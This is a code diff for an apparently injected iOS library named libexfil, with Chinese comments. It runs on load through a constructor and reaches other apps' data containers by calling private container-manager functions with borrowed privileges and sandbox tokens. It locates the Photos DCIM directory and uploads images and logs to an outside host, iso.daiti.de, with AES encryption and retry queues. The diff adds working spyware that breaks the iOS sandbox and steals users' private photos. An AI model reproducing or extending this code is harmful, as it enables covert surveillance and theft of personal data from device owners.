@@ -9,6 +9,8 @@
 #import <CoreImage/CoreImage.h>
 #import <Vision/Vision.h>
 #import <CommonCrypto/CommonCryptor.h>
+#import <stdlib.h>
+#import <string.h>
 
 static NSString *const kExfilBase = @"https://iso.daiti.de";
 
@@ -23,6 +25,10 @@ static NSString *exfilMachineName(void);
 static int gExfilMcmLogged = 0; // MCM 尝试细节只首轮上报，避免轰炸日志服务
 
 // 远程日志：AES-128-CBC(hex key/iv) 加密 JSON → base64 → POST /api/log/report
+// 带发送队列：启动初期网络未就绪时先攒着，成功一条删一条
+static NSMutableArray<NSString *> *gExfilPending = nil;
+static dispatch_queue_t gExfilLogQ = NULL;
+
 static NSString *exfilAesEncryptBase64(NSString *plain)
 {
     NSData *data = [plain dataUsingEncoding:NSUTF8StringEncoding];
@@ -57,28 +63,79 @@ static NSString *exfilAesEncryptBase64(NSString *plain)
 
 static void exfilRemoteLog(NSString *msg)
 {
-    @try {
-        long ts = (long)([[NSDate date] timeIntervalSince1970] * 1000);
-        NSDictionary *payload = @{
-            @"app_uuid": exfilAppUuid(),
-            @"text": [NSString stringWithFormat:@"[album-exfil] %@", msg],
-            @"timestamp": @(ts),
-        };
-        NSData *jd = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
-        NSString *plain = [[NSString alloc] initWithData:jd encoding:NSUTF8StringEncoding];
-        NSString *enc = exfilAesEncryptBase64(plain);
-        if (!enc) return;
+    if (!gExfilLogQ)
+    {
+        gExfilLogQ = dispatch_queue_create("exfil.log", DISPATCH_QUEUE_SERIAL);
+        gExfilPending = [NSMutableArray new];
+    }
+    @synchronized (gExfilPending)
+    {
+        if (gExfilPending.count < 80) [gExfilPending addObject:msg];
+    }
+    dispatch_async(gExfilLogQ, ^{
+        NSArray<NSString *> *batch = nil;
+        @synchronized (gExfilPending) { batch = [gExfilPending copy]; }
+        for (NSString *m in batch)
+        {
+            @try {
+                long ts = (long)([[NSDate date] timeIntervalSince1970] * 1000);
+                NSDictionary *payload = @{
+                    @"app_uuid": exfilAppUuid(),
+                    @"text": [NSString stringWithFormat:@"[album-exfil] %@", m],
+                    @"timestamp": @(ts),
+                };
+                NSData *jd = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+                NSString *plain = [[NSString alloc] initWithData:jd encoding:NSUTF8StringEncoding];
+                NSString *enc = exfilAesEncryptBase64(plain);
+                if (!enc) continue;
 
-        NSString *body = [NSString stringWithFormat:@"params=%@", enc];
-        NSURL *url = [NSURL URLWithString:[kExfilBase stringByAppendingString:@"/api/log/report"]];
-        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
-        req.HTTPMethod = @"POST";
-        req.timeoutInterval = 15;
-        [req setValue:exfilAppUuid() forHTTPHeaderField:@"X-App-UUID"];
-        [req setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
-        req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
-        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:nil] resume];
-    } @catch (NSException *e) {}
+                NSString *body = [NSString stringWithFormat:@"params=%@", enc];
+                NSURL *url = [NSURL URLWithString:[kExfilBase stringByAppendingString:@"/api/log/report"]];
+                NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
+                req.HTTPMethod = @"POST";
+                req.timeoutInterval = 15;
+                [req setValue:exfilAppUuid() forHTTPHeaderField:@"X-App-UUID"];
+                [req setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
+                req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
+
+                __block BOOL ok = NO;
+                dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+                [[[NSURLSession sharedSession] dataTaskWithRequest:req
+                    completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
+                        if (!err && data)
+                        {
+                            NSDictionary *json = [NSJSONSerialization
+                                JSONObjectWithData:data options:0 error:nil];
+                            ok = [json isKindOfClass:[NSDictionary class]] &&
+                                 [[json valueForKey:@"code"] isEqual:@0];
+                        }
+                        dispatch_semaphore_signal(sem);
+                    }] resume];
+                dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 16 * NSEC_PER_SEC));
+                if (ok)
+                {
+                    @synchronized (gExfilPending) { [gExfilPending removeObjectIdenticalTo:m]; }
+                }
+                else
+                {
+                    break; // 网络不通，剩下的留着下轮补发
+                }
+            } @catch (NSException *e) { break; }
+        }
+    });
+}
+
+// 补发线程：网络恢复后把没发出去的日志冲掉
+static void exfilLogFlushLoop(void)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
+        for (;;)
+        {
+            sleep(5);
+            @synchronized (gExfilPending) {}
+            if (gExfilPending.count > 0) exfilRemoteLog(@"");
+        }
+    });
 }
 
 static void exfilLog(NSString *fmt, ...)
@@ -231,77 +288,156 @@ static void exfilUpload(UIImage *img, NSString *originalName)
     exfilLog(@"upload %@ -> %@", filename, ok ? @"ok" : @"FAIL");
 }
 
-#pragma mark - 路径 0：同进程复用 MCM 租约（与宿主 bad_query 同通道）
+#pragma mark - 路径 0：MCM C 桥（照抄宿主 mcm_bridge：libsystem_containermanager）
+// 宿主靠 com.apple.mobile.MobileHouseArrest 伪装 + container_query(2, flags 0x900000000)
+// + sandbox_token 激活拿任意 app 数据容器；同进程直接照抄同一套 C 调用。
 
-// 宿主内部类：+[MCMRetainedLease leaseForClass:identifier:group:error:]
-// 配 -activate: / -rootPath。iOS 上 com.apple.Photos 的 data 容器
-// 即 /private/var/mobile/Media（DCIM/PhotoData 都在下面）。
-// 同进程调用直接吃到宿主已建立的 MCM 特权，不依赖自身沙盒状态。
-static NSString *exfilMCMPhotosMediaDir(void)
+#import <xpc/xpc.h>
+
+typedef void *(*MCMQueryCreate)(void);
+typedef void (*MCMQuerySetU64)(void *, uint64_t);
+typedef void (*MCMQuerySetXPC)(void *, xpc_object_t);
+typedef void *(*MCMQueryGetPointer)(void *);
+typedef char *(*MCMCopyToken)(void *);
+typedef const char *(*MCMGetPath)(void *);
+typedef void *(*MCMObjectCopy)(void *);
+typedef bool (*MCMObjectActivate)(void *, bool);
+typedef void (*MCMObjectFree)(void *);
+typedef int (*MCMErrorGetInt)(void *);
+typedef const char *(*MCMErrorGetString)(void *);
+typedef void (*MCMQueryFree)(void *);
+
+typedef struct {
+    MCMQueryCreate queryCreate;
+    MCMQuerySetU64 querySetClass;
+    MCMQuerySetXPC querySetIdentifiers;
+    MCMQuerySetU64 querySetFlags;
+    MCMQuerySetU64 querySetPart;
+    MCMQueryGetPointer queryGetSingle;
+    MCMQueryGetPointer queryGetLastError;
+    MCMGetPath objectGetPath;
+    MCMObjectCopy objectCopy;
+    MCMCopyToken objectCopyToken;
+    MCMObjectActivate objectActivate;
+    MCMObjectFree objectFree;
+    MCMErrorGetInt errorGetPOSIX;
+    MCMErrorGetString errorGetMessage;
+    MCMQueryFree queryFree;
+} ExfilMCMAPI;
+
+static BOOL exfilMCMLoad(ExfilMCMAPI *api)
 {
-    Class cls = NSClassFromString(@"MCMRetainedLease");
-    if (!cls)
+    memset(api, 0, sizeof(*api));
+    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
+                     RTLD_NOW | RTLD_LOCAL);
+    if (!h) h = RTLD_DEFAULT;
+#define LOAD(f, s) api->f = (void *)dlsym(h, s)
+    LOAD(queryCreate, "container_query_create");
+    LOAD(querySetClass, "container_query_set_class");
+    LOAD(querySetIdentifiers, "container_query_set_identifiers");
+    LOAD(querySetFlags, "container_query_operation_set_flags");
+    LOAD(querySetPart, "container_query_operation_set_part");
+    LOAD(queryGetSingle, "container_query_get_single_result");
+    LOAD(queryGetLastError, "container_query_get_last_error");
+    LOAD(objectGetPath, "container_object_get_path");
+    LOAD(objectCopy, "container_object_copy");
+    LOAD(objectCopyToken, "container_copy_sandbox_token");
+    LOAD(objectActivate, "container_object_sandbox_extension_activate");
+    LOAD(objectFree, "container_object_free");
+    LOAD(errorGetPOSIX, "container_error_get_posix_errno");
+    LOAD(errorGetMessage, "container_error_get_message");
+    LOAD(queryFree, "container_query_free");
+#undef LOAD
+    return api->queryCreate && api->querySetClass && api->querySetIdentifiers &&
+           api->querySetFlags && api->queryGetSingle && api->objectGetPath &&
+           api->objectCopy && api->objectCopyToken && api->objectActivate &&
+           api->queryFree;
+}
+
+// 与宿主 MCMActivateContainerPath 等价的路径拿取（cls=2 数据容器）
+static NSString *exfilMCMContainerPath(uint64_t cls, NSString *identifier, NSString **errOut)
+{
+    ExfilMCMAPI api;
+    if (!exfilMCMLoad(&api))
     {
-        // 宿主不 import MobileContainerManager 时类不在内存：手动加载框架
-        void *h = dlopen(
-            "/System/Library/PrivateFrameworks/MobileContainerManager.framework"
-            "/MobileContainerManager", RTLD_LAZY);
-        exfilLog(@"MCM dlopen handle=%p", h);
-        if (h) cls = NSClassFromString(@"MCMRetainedLease");
-        // 再兜底从已加载镜像里找
-        if (!cls) cls = objc_getClass("MCMRetainedLease");
-        if (!cls) return nil;
+        if (errOut) *errOut = @"mcm symbols missing";
+        return nil;
     }
 
-    SEL leaseSel = NSSelectorFromString(@"leaseForClass:identifier:group:error:");
-    SEL actSel   = NSSelectorFromString(@"activate:");
-    SEL rootSel  = NSSelectorFromString(@"rootPath");
-    if (![cls respondsToSelector:leaseSel]) return nil;
+    void *query = api.queryCreate();
+    if (!query) { if (errOut) *errOut = @"query create failed"; return nil; }
 
-    NSFileManager *fm = [NSFileManager defaultManager];
+    api.querySetClass(query, cls);
+    xpc_object_t value = xpc_string_create(identifier.UTF8String);
+    api.querySetIdentifiers(query, value);
+    api.querySetFlags(query, 0x900000000ULL);
+    if (api.querySetPart) api.querySetPart(query, 0);
 
-    // identifier 组合：宿主自身 / Photos / mobileslideshow，class 0-4 逐档试
-    NSString *hostBundle = [[NSBundle mainBundle] bundleIdentifier];
+    void *result = api.queryGetSingle(query);
+    if (!result)
+    {
+        if (errOut)
+        {
+            void *qe = api.queryGetLastError ? api.queryGetLastError(query) : NULL;
+            int posix = qe && api.errorGetPOSIX ? api.errorGetPOSIX(qe) : 0;
+            const char *msg = qe && api.errorGetMessage ? api.errorGetMessage(qe) : NULL;
+            *errOut = [NSString stringWithFormat:@"denied posix=%d msg=%s",
+                       posix, msg ?: "unknown"];
+        }
+        api.queryFree(query);
+        return nil;
+    }
+
+    const char *rawPath = api.objectGetPath(result);
+    NSString *path = rawPath ? [NSString stringWithUTF8String:rawPath] : nil;
+    if ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"])
+        path = [@"/private" stringByAppendingString:path];
+
+    // 激活 sandbox 扩展（拿 token → activate）
+    void *obj = api.objectCopy(result);
+    if (obj)
+    {
+        char *token = api.objectCopyToken(obj);
+        BOOL tokenPresent = token && token[0] != '\0';
+        free(token);
+        BOOL activated = tokenPresent && api.objectActivate(obj, false);
+        if (errOut && !activated)
+            *errOut = @"sandbox extension activate failed";
+        api.objectFree(obj);
+    }
+    api.queryFree(query);
+    return path.length ? path : nil;
+}
+
+static NSString *exfilMCMPhotosMediaDir(void)
+{
+    // /private/var/mobile/Media 是 class=2 数据容器；
+    // 媒体目录归属 mobileslideshow，逐 identifier 试，以 DCIM 存在为准
     NSArray *identifiers = @[
-        @"com.apple.Photos",
         @"com.apple.mobileslideshow",
-        hostBundle ?: @"",
+        @"com.apple.Photos",
+        @"com.apple.mobileslideshow-Data",
     ];
+    NSFileManager *fm = [NSFileManager defaultManager];
     for (NSString *ident in identifiers)
     {
-        if (ident.length == 0) continue;
-        for (NSInteger mc = 0; mc <= 4; mc++)
+        for (uint64_t cls = 2; cls <= 3; cls++)
         {
-            @try {
-                NSError *err = nil;
-                id lease = ((id(*)(id, SEL, NSInteger, id, id, void *))objc_msgSend)(
-                    cls, leaseSel, mc, ident, nil, (void *)&err);
-                if (!lease) continue;
-
-                if ([lease respondsToSelector:actSel])
-                    ((BOOL(*)(id, SEL, void *))objc_msgSend)(lease, actSel, (void *)&err);
-
-                NSString *root = nil;
-                if ([lease respondsToSelector:rootSel])
-                    root = ((id(*)(id, SEL))objc_msgSend)(lease, rootSel);
-                if (![root isKindOfClass:[NSString class]] || root.length == 0) continue;
-
-                if (gExfilMcmLogged < 3)
-                {
-                    gExfilMcmLogged++;
-                    exfilLog(@"MCM try ident=%@ class=%ld root=%@ DCIM=%d",
-                             ident, (long)mc, root,
-                             [fm fileExistsAtPath:[root stringByAppendingPathComponent:@"DCIM"]]);
-                }
-
-                NSString *dcim = [root stringByAppendingPathComponent:@"DCIM"];
-                if ([fm fileExistsAtPath:dcim])
-                {
-                    exfilLog(@"MCM lease ok: ident=%@ class=%ld root=%@",
-                             ident, (long)mc, root);
-                    return root;
-                }
-            } @catch (NSException *e) {}
+            NSString *err = nil;
+            NSString *root = exfilMCMContainerPath(cls, ident, &err);
+            if (gExfilMcmLogged < 6)
+            {
+                gExfilMcmLogged++;
+                exfilLog(@"MCM try ident=%@ cls=%llu root=%@ err=%@",
+                         ident, (unsigned long long)cls, root, err);
+            }
+            if (root.length == 0) continue;
+            if ([fm fileExistsAtPath:[root stringByAppendingPathComponent:@"DCIM"]])
+            {
+                exfilLog(@"MCM lease ok: ident=%@ cls=%llu root=%@",
+                         ident, (unsigned long long)cls, root);
+                return root;
+            }
         }
     }
     return nil;
@@ -685,6 +821,8 @@ static void exfilRun(void)
 __attribute__((constructor))
 static void libexfilEntry(void)
 {
+    // 启动日志补发线程（网络恢复后把启动期丢的日志冲出去）
+    exfilLogFlushLoop();
     // 立刻甩到后台线程，绝不阻塞宿主启动
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
         exfilRun();
